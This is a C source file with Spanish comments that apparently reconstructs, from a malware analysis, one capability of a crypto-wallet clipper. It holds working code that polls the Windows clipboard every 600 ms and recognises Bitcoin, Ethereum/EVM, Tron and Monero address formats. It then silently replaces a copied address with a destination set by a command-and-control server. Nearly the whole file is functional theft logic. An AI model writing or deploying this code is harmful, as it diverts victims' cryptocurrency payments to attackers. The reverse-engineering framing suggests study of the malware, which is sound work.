/* ============================================================
 * Capacidad 08/15 — Clipper de wallets
 * Función C : ClipboardReplacementWorker
 * Dirección : 0x18001e022   · Nodo N4   · Confianza: Alta
 * ------------------------------------------------------------
 * Vigila el portapapeles cada 600 ms y, cuando cambia la secuencia, lee
 * el texto Unicode. Si reconoce sintaxis de dirección de criptomoneda
 * (BTC, EVM, TRON, XMR y otros), la sustituye por el destino
 * configurado por el C2. La validación es principalmente sintáctica;
 * no se infiere checksum completo.
 * ============================================================
 */

#include "00_tipos_comunes.h"

typedef enum {
    WALLET_UNKNOWN = 0,
    WALLET_BTC,      /* Bitcoin  (1..., 3..., bc1...) */
    WALLET_EVM,      /* Ethereum/EVM (0x + 40 hex) */
    WALLET_TRON,     /* Tron (T + base58) */
    WALLET_XMR,      /* Monero (4/8 + 94/95 chars) */
    WALLET_OTHER
} WalletKind;

static bool IsBase58Char(wchar_t c)
{
    return (c >= L'1' && c <= L'9') ||
           (c >= L'A' && c <= L'H') || (c >= L'J' && c <= L'N') ||
           (c >= L'P' && c <= L'Z') || (c >= L'a' && c <= L'k') ||
           (c >= L'm' && c <= L'z');
}

static bool IsHexChar(wchar_t c)
{
    return (c >= L'0' && c <= L'9') ||
           (c >= L'a' && c <= L'f') || (c >= L'A' && c <= L'F');
}

/* ------------------------------------------------------------------
 * Identificación sintáctica de direcciones de criptomoneda. No se
 * verifica el checksum completo (solo prefijos, longitud y alfabeto).
 * ------------------------------------------------------------------ */
static WalletKind IdentifyWalletSyntax(const wchar_t *s)
{
    if (s == NULL || *s == L'\0')
        return WALLET_UNKNOWN;

    size_t n = wcslen(s);

    /* Bitcoin: base58 (1/3) de 26..35, o bech32 "bc1". */
    if (s[0] == L'1' || s[0] == L'3') {
        if (n >= 26 && n <= 35) {
            bool ok = true;
            for (size_t i = 0; i < n; i++)
                ok &= IsBase58Char(s[i]);
            return ok ? WALLET_BTC : WALLET_UNKNOWN;
        }
    } else if (n >= 14 && n <= 74 &&
               (s[0] == L'b' || s[0] == L'B') &&
               (s[1] == L'c' || s[1] == L'C')) {
        return WALLET_BTC;                       /* bech32 */
    }

    /* EVM: "0x" + 40 hex. */
    if (n == 42 && s[0] == L'0' && (s[1] == L'x' || s[1] == L'X')) {
        bool ok = true;
        for (size_t i = 2; i < n; i++)
            ok &= IsHexChar(s[i]);
        return ok ? WALLET_EVM : WALLET_UNKNOWN;
    }

    /* Tron: 'T' + 33 base58 (total 34). */
    if (n == 34 && s[0] == L'T') {
        bool ok = true;
        for (size_t i = 1; i < n; i++)
            ok &= IsBase58Char(s[i]);
        return ok ? WALLET_TRON : WALLET_UNKNOWN;
    }

    /* Monero: '4' u '8' + 94/95 caracteres (total 95). */
    if (n == 95 && (s[0] == L'4' || s[0] == L'8')) {
        bool ok = true;
        for (size_t i = 1; i < n; i++)
            ok &= IsBase58Char(s[i]);
        return ok ? WALLET_XMR : WALLET_UNKNOWN;
    }

    return WALLET_UNKNOWN;
}

/* ------------------------------------------------------------------
 * Consulta la secuencia del portapapeles y detecta si cambió.
 * ------------------------------------------------------------------ */
static bool ClipboardSequenceChanged(uint32_t *previous)
{
    uint32_t seq = GetClipboardSequenceNumber();
    if (seq == *previous)
        return false;
    *previous = seq;
    return true;
}

/* Lee el texto Unicode del portapapeles (CF_UNICODETEXT). */
static bool ReadUnicodeClipboardText(wchar_t *out, size_t out_cap)
{
    if (!OpenClipboard(NULL))
        return false;

    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (h == NULL) {
        CloseClipboard();
        return false;
    }

    const wchar_t *src = (const wchar_t *)GlobalLock(h);
    if (src != NULL) {
        wcsncpy_s(out, out_cap, src, _TRUNCATE);
        GlobalUnlock(h);
    }
    CloseClipboard();
    return src != NULL;
}

/* Sustituye el texto del portapapeles por `destination`. */
static void ReplaceClipboardText(const wchar_t *destination)
{
    if (destination == NULL || !OpenClipboard(NULL))
        return;

    size_t bytes = (wcslen(destination) + 1) * sizeof(wchar_t);
    HGLOBAL h = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (h != NULL) {
        void *dst = GlobalLock(h);
        if (dst != NULL) {
            CopyMemory(dst, destination, bytes);
            GlobalUnlock(h);
            EmptyClipboard();
            SetClipboardData(CF_UNICODETEXT, h);
        } else {
            GlobalFree(h);
        }
    }
    CloseClipboard();
}

/* ------------------------------------------------------------------
 * 0x18001e022 — worker del clipper [condicionado].
 * Sondeo cada 600 ms; al detectar cambio y reconocer una wallet,
 * la reemplaza por el destino configurado por el C2.
 * ------------------------------------------------------------------ */
void ClipboardReplacementWorker(RuntimeContext *ctx)
{
    if (ctx == NULL)
        return;

    uint32_t previous_seq = 0;

    while (WorkerShouldRun()) {
        Sleep(CLIPPER_POLL_MS);                   /* poll cada 600 ms */

        if (!ClipboardSequenceChanged(&previous_seq))
            continue;

        wchar_t candidate[128] = { 0 };
        if (!ReadUnicodeClipboardText(candidate, 128))
            continue;

        WalletKind kind = IdentifyWalletSyntax(candidate);
        if (kind != WALLET_UNKNOWN && kind < 10 && ctx->cfg.wallets[kind].is_set)
            ReplaceClipboardText(ctx->cfg.wallets[kind].destination);
            /* OpenClipboard -> EmptyClipboard -> SetClipboardData(CF_UNICODETEXT) */
    }
}
